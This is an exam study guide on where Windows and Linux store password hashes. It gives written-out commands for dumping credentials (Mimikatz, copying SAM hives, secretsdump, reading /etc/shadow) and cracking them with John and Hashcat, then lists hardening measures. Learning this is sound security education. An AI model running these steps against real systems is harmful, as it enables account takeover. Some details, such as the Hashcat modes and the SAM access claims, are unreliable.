

# Password Storage in Windows and Linux – CNSP Exam Guide

This knowledge helps in identifying vulnerabilities, cracking stored passwords, and securing authentication mechanisms.

---

# 🔹 Windows Password Storage

### 1️⃣ Where Windows Stores Passwords

Windows stores user authentication data in two primary locations:  
✅ Security Account Manager (SAM) – Stores local user credentials.  
✅ NTDS.DIT (Active Directory Database) – Stores domain passwords.

#### 🔸 SAM File (Local Accounts)

- Path: `C:\Windows\System32\config\SAM`
- Protected by the LSA (Local Security Authority)
- Cannot be accessed directly while Windows is running.

🔹 Hashing Algorithm Used:

- NTLM Hash (NTLMv1 & NTLMv2) – Uses MD4 without salting (vulnerable to rainbow tables).
- LM Hash (Older versions) – Easily broken, as it stores uppercase-only and splits passwords.

#### 🔸 NTDS.DIT File (Active Directory)

- Path: `C:\Windows\NTDS\NTDS.dit`
- Stores domain user credentials.
- Uses NTLM or Kerberos for authentication.

🔹 Hashing Algorithm Used:

- NTLM (MD4-based)
- Kerberos (AES-based, more secure)

---

### 2️⃣ Extracting Windows Password Hashes

To extract hashes, you need SYSTEM-level privileges.

#### 🔸 Using Mimikatz

```sh
mimikatz
privilege::debug
sekurlsa::logonpasswords
```

- Dumps plaintext passwords from memory.

#### 🔸 Using `samdump2` (Offline)

- First, copy SAM and SYSTEM files:
    
    ```sh
    copy C:\Windows\System32\config\SAM .
    copy C:\Windows\System32\config\SYSTEM .
    ```
    
- Then, extract hashes:
    
    ```sh
    samdump2 SYSTEM SAM
    ```
    

#### 🔸 Using `secretsdump.py` (Remote Extraction)

```sh
secretsdump.py -sam -system -security Administrator@target-ip
```

---

### 3️⃣ Cracking Windows Passwords

After extracting hashes, use tools like:  
🔹 John the Ripper:

```sh
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
```

🔹 Hashcat (Fast GPU-based cracking):

```sh
hashcat -m 1000 hash.txt rockyou.txt --force
```

- `-m 1000` = NTLM hashes
- `-m 5500` = NTLMv2 hashes

---

# 🔹 Linux Password Storage

### 1️⃣ Where Linux Stores Passwords

Linux stores passwords in two key files:  
✅ `/etc/passwd` – Stores user information (used in older systems).  
✅ `/etc/shadow` – Stores hashed passwords (modern systems).

#### 🔸 `/etc/passwd` Format

Example entry:

```sh
root:x:0:0:root:/root:/bin/bash
```

- `x` → The password is stored in `/etc/shadow`.

#### 🔸 `/etc/shadow` Format

Example entry:

```sh
root:$6$salt$encrypted_password:19000:0:99999:7:::
```

- Hash format: `$id$salt$hashed_password`
    - `$1$` → MD5
    - `$5$` → SHA-256
    - `$6$` → SHA-512

---

### 2️⃣ Extracting Linux Password Hashes

To extract stored passwords, you need root privileges.

#### 🔸 Using `cat` (If root)

```sh
cat /etc/shadow
```

#### 🔸 Using `unshadow` (For Cracking)

Merge `/etc/passwd` and `/etc/shadow`:

```sh
unshadow /etc/passwd /etc/shadow > hashfile.txt
```

---

### 3️⃣ Cracking Linux Passwords

After obtaining hashes, use:

🔹 John the Ripper

```sh
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
```

🔹 Hashcat (Faster GPU Cracking)

```sh
hashcat -m 1800 hash.txt rockyou.txt
```

- `-m 1800` = SHA-512 hashes
- `-m 500` = MD5-based hashes

---

# 🔹 Hardening Password Storage Security

### ✅ Windows Security Best Practices

- Enforce Kerberos authentication instead of NTLM.
- Use LSASS protection to prevent dumping passwords.
- Implement Windows Defender Credential Guard.

### ✅ Linux Security Best Practices

- Enforce SHA-512-based hashing.
- Use PAM (Pluggable Authentication Modules) for strong authentication.
- Restrict access to `/etc/shadow` (`chmod 000 /etc/shadow`).

---

# 🔹 Summary

| Feature           | Windows (SAM/NTDS.DIT)             | Linux (`/etc/shadow`)           |
| ----------------- | ---------------------------------- | ------------------------------- |
| Storage Location  | `C:\Windows\System32\config\SAM`   | `/etc/shadow`                   |
| Default Hashing   | NTLM (MD4), Kerberos (AES)         | SHA-512, SHA-256                |
| Cracking Tools    | John the Ripper, Hashcat, Mimikatz | John the Ripper, Hashcat        |
| Security Weakness | NTLM hashes can be cracked easily  | Weak hash algorithms (MD5, DES) |

---
